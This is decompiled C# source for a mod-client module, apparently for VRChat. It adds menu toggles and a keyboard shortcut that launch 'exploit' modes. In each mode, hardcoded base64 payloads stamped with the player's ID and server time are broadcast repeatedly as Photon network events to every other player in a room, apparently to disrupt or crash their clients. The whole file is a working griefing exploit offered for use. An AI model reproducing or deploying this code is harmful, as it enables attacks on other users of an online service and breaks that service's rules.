using System;
using System.Collections;
using ExitGames.Client.Photon;
using Il2CppSystem;
using KernelClient.Wrapper;
using MelonLoader;
using Photon.Pun;
using Photon.Realtime;
using ReMod.Core.UI.QuickMenu;
using UnhollowerBaseLib;
using UnityEngine;
using VRC.SDKBase;

// Token: 0x02000013 RID: 19
internal class EnhancedCombinedExploit : KernelModule
{
	// Token: 0x0600005E RID: 94 RVA: 0x00006490 File Offset: 0x00004690
	public override void OnUiManagerInit()
	{
		ReMenuCategory category = MenuSetup._uiManager.QMMenu.GetCategoryPage(PageNames.Exploits).GetCategory(CatagoryNames.EONEcollection);
		category.AddToggle("Silent E1", "Silent mode exploitation", delegate(bool state)
		{
			this.isActiveSilent = state;
			if (state)
			{
				this.StartExploitLoop(EnhancedCombinedExploit.ExploitMode.Silent);
			}
			else
			{
				this.StopExploit(EnhancedCombinedExploit.ExploitMode.Silent);
			}
		}, false);
		category.AddToggle("Loud Void E1", "Void-like loud exploitation", delegate(bool state)
		{
			this.isActiveLoudVoid = state;
			if (state)
			{
				this.StartExploitLoop(EnhancedCombinedExploit.ExploitMode.LoudVoid);
			}
			else
			{
				this.StopExploit(EnhancedCombinedExploit.ExploitMode.LoudVoid);
			}
		}, false);
		category.AddToggle("Loud E1", "Standard loud exploitation", delegate(bool state)
		{
			this.isActiveLoud = state;
			if (state)
			{
				this.StartExploitLoop(EnhancedCombinedExploit.ExploitMode.Loud);
			}
			else
			{
				this.StopExploit(EnhancedCombinedExploit.ExploitMode.Loud);
			}
		}, false);
		category.AddToggle("Abyss E1", "Abyss mode exploitation", delegate(bool state)
		{
			this.isActiveAbyss = state;
			if (state)
			{
				this.StartExploitLoop(EnhancedCombinedExploit.ExploitMode.Abyss);
			}
			else
			{
				this.StopExploit(EnhancedCombinedExploit.ExploitMode.Abyss);
			}
		}, false);
		category.AddToggle("ERROR E1", "ERROR mode exploitation", delegate(bool state)
		{
			this.isActiveError = state;
			if (state)
			{
				this.StartExploitLoop(EnhancedCombinedExploit.ExploitMode.Error);
			}
			else
			{
				this.StopExploit(EnhancedCombinedExploit.ExploitMode.Error);
			}
		}, false);
		category.AddToggle("Stinky's E1", "Stinky mode exploitation", delegate(bool state)
		{
			this.isStinky = state;
			if (state)
			{
				this.StartExploitLoop(EnhancedCombinedExploit.ExploitMode.Stinky);
			}
			else
			{
				this.StopExploit(EnhancedCombinedExploit.ExploitMode.Stinky);
			}
		}, false);
		category.AddToggle("Combined E1", "All modes combined", delegate(bool state)
		{
			this.isActiveCombined = state;
			if (state)
			{
				this.StartExploitLoop(EnhancedCombinedExploit.ExploitMode.Combined);
			}
			else
			{
				this.StopExploit(EnhancedCombinedExploit.ExploitMode.Combined);
			}
		}, false);
	}

	// Token: 0x0600005F RID: 95 RVA: 0x00002266 File Offset: 0x00000466
	private void StartExploitLoop(EnhancedCombinedExploit.ExploitMode mode)
	{
		this.ResetCounters();
		MelonCoroutines.Start(this.EventLoop(mode));
		ToastNotif.Toast("E1 Exploit", string.Format("Starting {0} mode...", mode), null, 3f);
	}

	// Token: 0x06000060 RID: 96 RVA: 0x00006590 File Offset: 0x00004790
	private void StopExploit(EnhancedCombinedExploit.ExploitMode mode)
	{
		switch (mode)
		{
		case EnhancedCombinedExploit.ExploitMode.Silent:
			this.isActiveSilent = false;
			break;
		case EnhancedCombinedExploit.ExploitMode.LoudVoid:
			this.isActiveLoudVoid = false;
			break;
		case EnhancedCombinedExploit.ExploitMode.Loud:
			this.isActiveLoud = false;
			break;
		case EnhancedCombinedExploit.ExploitMode.Abyss:
			this.isActiveAbyss = false;
			break;
		case EnhancedCombinedExploit.ExploitMode.Error:
			this.isActiveError = false;
			break;
		case EnhancedCombinedExploit.ExploitMode.Combined:
			this.isActiveCombined = false;
			break;
		}
		ToastNotif.Toast("E1 Exploit", string.Format("Stopping {0} mode...", mode), null, 3f);
	}

	// Token: 0x06000061 RID: 97 RVA: 0x0000661C File Offset: 0x0000481C
	private void Eonekeybind()
	{
		bool flag = Input.GetKey(306) && Input.GetKey(304) && Input.GetKeyDown(101);
		if (flag)
		{
			this.isStinky = !this.isStinky;
			bool flag2 = this.isStinky;
			if (flag2)
			{
				this.StartExploitLoop(EnhancedCombinedExploit.ExploitMode.Stinky);
			}
			else
			{
				this.StopExploit(EnhancedCombinedExploit.ExploitMode.Stinky);
			}
		}
	}

	// Token: 0x06000062 RID: 98 RVA: 0x0000229E File Offset: 0x0000049E
	public override void OnUpdate()
	{
		this.Eonekeybind();
	}

	// Token: 0x06000063 RID: 99 RVA: 0x000022A8 File Offset: 0x000004A8
	private void ResetCounters()
	{
		this.eventCounter = 0;
		this.lastEventTime = Time.time;
	}

	// Token: 0x06000064 RID: 100 RVA: 0x000022BD File Offset: 0x000004BD
	private IEnumerator EventLoop(EnhancedCombinedExploit.ExploitMode mode)
	{
		while (this.IsActiveMode(mode))
		{
			this.eventCounter++;
			bool flag = this.ShouldThrottle();
			if (!flag)
			{
				int num;
				for (int i = 0; i < 3; i = num + 1)
				{
					bool flag2 = !this.IsActiveMode(mode);
					if (flag2)
					{
						break;
					}
					bool flag3 = this.ShouldThrottle();
					if (flag3)
					{
						break;
					}
					bool flag4 = mode == EnhancedCombinedExploit.ExploitMode.Error;
					if (flag4)
					{
						this.SendErrorEvents();
					}
					else
					{
						this.SendEvent(mode);
					}
					num = i;
				}
				yield return new WaitForSeconds(this.CalculateOptimalDelay());
			}
		}
		yield break;
	}

	// Token: 0x06000065 RID: 101 RVA: 0x00006684 File Offset: 0x00004884
	private bool IsActiveMode(EnhancedCombinedExploit.ExploitMode mode)
	{
		if (!true)
		{
		}
		bool flag;
		switch (mode)
		{
		case EnhancedCombinedExploit.ExploitMode.Silent:
			flag = this.isActiveSilent;
			break;
		case EnhancedCombinedExploit.ExploitMode.LoudVoid:
			flag = this.isActiveLoudVoid;
			break;
		case EnhancedCombinedExploit.ExploitMode.Loud:
			flag = this.isActiveLoud;
			break;
		case EnhancedCombinedExploit.ExploitMode.Abyss:
			flag = this.isActiveAbyss;
			break;
		case EnhancedCombinedExploit.ExploitMode.Error:
			flag = this.isActiveError;
			break;
		case EnhancedCombinedExploit.ExploitMode.Combined:
			flag = this.isActiveCombined;
			break;
		case EnhancedCombinedExploit.ExploitMode.Stinky:
			flag = this.isStinky;
			break;
		default:
			flag = false;
			break;
		}
		if (!true)
		{
		}
		return flag;
	}

	// Token: 0x06000066 RID: 102 RVA: 0x00006714 File Offset: 0x00004914
	private bool ShouldThrottle()
	{
		float num = Time.time - this.lastEventTime;
		return this.eventCounter >= 500 && num <= 1f;
	}

	// Token: 0x06000067 RID: 103 RVA: 0x00006750 File Offset: 0x00004950
	private float CalculateOptimalDelay()
	{
		float num = Mathf.Lerp(0.05f, 2f, (float)this.eventCounter / 30f);
		MelonLogger.Msg(num);
		return Mathf.Lerp(0.05f, 2f, (float)this.eventCounter / 30f);
	}

	// Token: 0x06000068 RID: 104 RVA: 0x000067A8 File Offset: 0x000049A8
	private void SendErrorEvents()
	{
		try
		{
			string[] error_PAYLOADS = EnhancedCombinedExploit.ERROR_PAYLOADS;
			foreach (string text in error_PAYLOADS)
			{
				byte[] array2 = Convert.FromBase64String(text);
				Buffer.BlockCopy(BitConverter.GetBytes(Networking.GetServerTimeInMilliseconds()), 0, array2, 4, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(VRCPlayer.field_Internal_Static_VRCPlayer_0.Method_Public_get_VRCPlayerApi_0().playerId), 0, array2, 0, 4);
				Il2CppStructArray<byte> il2CppStructArray = new Il2CppStructArray<byte>((long)array2.Length);
				for (int j = 0; j < array2.Length; j++)
				{
					il2CppStructArray[j] = array2[j];
				}
				RaiseEventOptions raiseEventOptions = new RaiseEventOptions
				{
					field_Public_ReceiverGroup_0 = 1,
					field_Public_EventCaching_0 = 0
				};
				PhotonNetwork.Method_Public_Static_Boolean_Byte_Object_RaiseEventOptions_SendOptions_0(1, il2CppStructArray.Cast<Object>(), raiseEventOptions, default(SendOptions));
			}
		}
		catch (Exception ex)
		{
			MelonLogger.Error("[E1 Exploit] Send error in ERROR mode: " + ex.Message);
		}
	}

	// Token: 0x06000069 RID: 105 RVA: 0x000068B0 File Offset: 0x00004AB0
	private void SendEvent(EnhancedCombinedExploit.ExploitMode mode)
	{
		try
		{
			if (!true)
			{
			}
			string text;
			switch (mode)
			{
			case EnhancedCombinedExploit.ExploitMode.Silent:
				text = EnhancedCombinedExploit.SILENT_PAYLOAD;
				goto IL_0090;
			case EnhancedCombinedExploit.ExploitMode.LoudVoid:
				text = EnhancedCombinedExploit.LOUD_VOID_PAYLOADS[this.random.Next(EnhancedCombinedExploit.LOUD_VOID_PAYLOADS.Length)];
				goto IL_0090;
			case EnhancedCombinedExploit.ExploitMode.Loud:
				text = EnhancedCombinedExploit.LOUD_PAYLOADS[this.random.Next(EnhancedCombinedExploit.LOUD_PAYLOADS.Length)];
				goto IL_0090;
			case EnhancedCombinedExploit.ExploitMode.Abyss:
				text = EnhancedCombinedExploit.ABYSS_PAYLOAD;
				goto IL_0090;
			case EnhancedCombinedExploit.ExploitMode.Combined:
				text = this.SelectCombinedPayload();
				goto IL_0090;
			case EnhancedCombinedExploit.ExploitMode.Stinky:
				text = EnhancedCombinedExploit.STINKY_PAYLOAD;
				goto IL_0090;
			}
			text = EnhancedCombinedExploit.SILENT_PAYLOAD;
			IL_0090:
			if (!true)
			{
			}
			string text2 = text;
			string text3 = text2;
			byte[] array = Convert.FromBase64String(text3);
			Buffer.BlockCopy(BitConverter.GetBytes(Networking.GetServerTimeInMilliseconds()), 0, array, 4, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(VRCPlayer.field_Internal_Static_VRCPlayer_0.Method_Public_get_VRCPlayerApi_0().playerId), 0, array, 0, 4);
			Il2CppStructArray<byte> il2CppStructArray = new Il2CppStructArray<byte>((long)array.Length);
			for (int i = 0; i < array.Length; i++)
			{
				il2CppStructArray[i] = array[i];
			}
			RaiseEventOptions raiseEventOptions = new RaiseEventOptions
			{
				field_Public_ReceiverGroup_0 = 1,
				field_Public_EventCaching_0 = 0
			};
			PhotonNetwork.Method_Public_Static_Boolean_Byte_Object_RaiseEventOptions_SendOptions_0(1, il2CppStructArray.Cast<Object>(), raiseEventOptions, default(SendOptions));
		}
		catch (Exception ex)
		{
			MelonLogger.Error(string.Format("[E1 Exploit] Send error in {0} mode: {1}", mode, ex.Message));
		}
	}

	// Token: 0x0600006A RID: 106 RVA: 0x00006A34 File Offset: 0x00004C34
	private string SelectCombinedPayload()
	{
		int num = this.random.Next(15);
		bool flag = num < 3;
		string text;
		if (flag)
		{
			text = EnhancedCombinedExploit.SILENT_PAYLOAD;
		}
		else
		{
			bool flag2 = num < 6;
			if (flag2)
			{
				text = EnhancedCombinedExploit.LOUD_VOID_PAYLOADS[this.random.Next(EnhancedCombinedExploit.LOUD_VOID_PAYLOADS.Length)];
			}
			else
			{
				bool flag3 = num < 9;
				if (flag3)
				{
					text = EnhancedCombinedExploit.LOUD_PAYLOADS[this.random.Next(EnhancedCombinedExploit.LOUD_PAYLOADS.Length)];
				}
				else
				{
					bool flag4 = num < 12;
					if (flag4)
					{
						text = EnhancedCombinedExploit.ABYSS_PAYLOAD;
					}
					else
					{
						text = EnhancedCombinedExploit.ERROR_PAYLOADS[this.random.Next(EnhancedCombinedExploit.ERROR_PAYLOADS.Length)];
					}
				}
			}
		}
		return text;
	}

	// Token: 0x04000064 RID: 100
	private bool isActiveSilent = false;

	// Token: 0x04000065 RID: 101
	private bool isActiveLoudVoid = false;

	// Token: 0x04000066 RID: 102
	private bool isActiveLoud = false;

	// Token: 0x04000067 RID: 103
	private bool isActiveAbyss = false;

	// Token: 0x04000068 RID: 104
	private bool isActiveError = false;

	// Token: 0x04000069 RID: 105
	private bool isActiveCombined = false;

	// Token: 0x0400006A RID: 106
	private bool isStinky = false;

	// Token: 0x0400006B RID: 107
	private readonly Random random = new Random();

	// Token: 0x0400006C RID: 108
	private float lastEventTime = 0f;

	// Token: 0x0400006D RID: 109
	private int eventCounter = 0;

	// Token: 0x0400006E RID: 110
	private static readonly string[] ERROR_PAYLOADS = new string[] { "QwYAAEWhESjzrD0A+PTUA4+bi+0LaUxtDTCBf75zt9hhu0RMSn256S+Z5UFCa3TTpz7Vn+dqmsK22eM1c3QV2OkEnvb+V/VMgfSsPQD49NQ67K6//enjQ8caLBaso6feWZyjV1q6GQ09u6w6bw91CJzBBv8QxGNMEa8S0ZHgYsGLpNZYHzhn03iA9aw9APj0cbv6WD3sl6rbmZYvfDksrFMhDuaBoQeYWfXNDDFik9egcVcvAPfocJkwpJ7vRPS5QgCfiNUdn/AGbIH2rD0A+PTUNLlMaIau6JuUEFFVYpv/yWOVDLSshOI1mmUB9ujkr8KEmIu3keB87DekOFGRmaNgu8TWVvVXjTLogPesPQD49HQVoW8ADMH2KouFZ8eZB3tv/2X+ld6MklOeIE7HE+cY+m1QEkeUgdM0Fc+vQi5ZI21+sAEnmaXx1WqB", "AgAAAKWkyYm7hjsA+H3owFygUv4w5B67lcSx14zff9FCPADiNbSwYWgE+O7DrSy5tkRecs21ljjofvebe6xsYlA4cVmgrd0=" };

	// Token: 0x0400006F RID: 111
	private static readonly string SILENT_PAYLOAD = "CAAAADx3SG8eYzoAeJYLkm09XMKdEYOE+l/Enz9tFP5pplHGi/o+XDjCGrpnUeqSW8wWfhfzPXkD9ReI8ioo7fXi1GOdZB9jMgB4n64Y5JoaLUt0dZXF/XHDuQFpIj73SHaA0FyjQrj1oIU81HPlhGZy3NqVLFXilJVY4Q==";

	// Token: 0x04000070 RID: 112
	private static readonly string[] LOUD_VOID_PAYLOADS = new string[] { "AAAAAGfp+Lv2GRkA+DrJaWerbtZm+SX2//kATwCqqvu/z6rLog==", "AAAAAGfp+Lv2GRkA+DrDusChW99guelWc00gcgDuhh911CBUpe==" };

	// Token: 0x04000071 RID: 113
	private static readonly string[] LOUD_PAYLOADS = new string[] { "AAAAAGfp+Lv2GRkA+DrDusChW99tttlWc00gcgDuhh911CBUpe==", "AAAAAGfp+Lv2GRkA+DrDussssss99wssstssssstttsswwsese==", "AAAAAGfp+Lv2GRkA+DrDusChW99guelWc00gcgDuhh911CBUpe==", "AAAAAGfp+Lv2GRkA+DrJaWerbistduJawerbistdujawerbist==", "AAAAAGfp+Lv2GRkA+DrDusChW9QFHJlWc00gcgDuhh911CBUpe==", "AAAAAGfp+Lv2GRkA+DrDufffffftrhehfgdhgdrgerer1CBUpe==" };

	// Token: 0x04000072 RID: 114
	private static readonly string ABYSS_PAYLOAD = "AAAAAOlO/DO7hjsA+H3owFygUv4w5B67lcSx14zff9FCPADiNbSwYWgE+O7DrSy5tkRecs21ljjofvebe6xsYlA4cVmgrd0=";

	// Token: 0x04000073 RID: 115
	private static readonly string STINKY_PAYLOAD = "AAAAAGfp+Lv2GRkA+DrDussssss99wssstssssstttsswwsese==";

	// Token: 0x02000014 RID: 20
	private enum ExploitMode
	{
		// Token: 0x04000075 RID: 117
		Silent,
		// Token: 0x04000076 RID: 118
		LoudVoid,
		// Token: 0x04000077 RID: 119
		Loud,
		// Token: 0x04000078 RID: 120
		Abyss,
		// Token: 0x04000079 RID: 121
		Error,
		// Token: 0x0400007A RID: 122
		Combined,
		// Token: 0x0400007B RID: 123
		Stinky
	}
}
